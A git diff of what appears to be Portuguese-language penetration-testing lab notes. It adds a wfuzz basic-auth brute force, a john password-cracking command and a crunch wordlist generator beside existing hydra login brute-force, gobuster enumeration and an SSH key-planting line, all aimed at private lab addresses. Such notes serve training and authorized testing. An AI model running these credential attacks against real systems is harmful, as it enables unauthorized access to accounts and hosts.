@@ -192,8 +192,10 @@ linuxvictim@linuxvictim:~$ echo "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8= ka
 hydra -l marujo -P /usr/share/wordlists/rockyou.txt -t 3 -f 192.168.90.43 http-post-form "/?action=login:username=^USER^&password=^PASS^:Usuário ou senha inválido\!"
 
 hydra -l admin -P /usr/share/wordlists/rockyou.txt -o saida.txt 192.168.90.84 http-get /webdav
-
+ wfuzz -c -z file,/usr/share/wordlists/rockyou.txt --hc 401 --basic admin:FUZZ http://192.168.90.194/upload  
 gobuster dir -u http://192.168.90.77/cmd/ -w /usr/share/wordlists/dirb/big.txt -o gobuster90-77.txt
+
+john --wordlist=/usr/share/wordlists/rockyou.txt admin 
 ```
 
 ```
@@ -226,7 +228,10 @@ linuxvictim@linuxvictim:~$
 ```
 
 
-
+Gerar Wordlist
+```
+crunch 4 4 1234567890 -o wordist.txt
+```
 
 CGI-BINS
 Testei o cgi-bin sem sucesso:
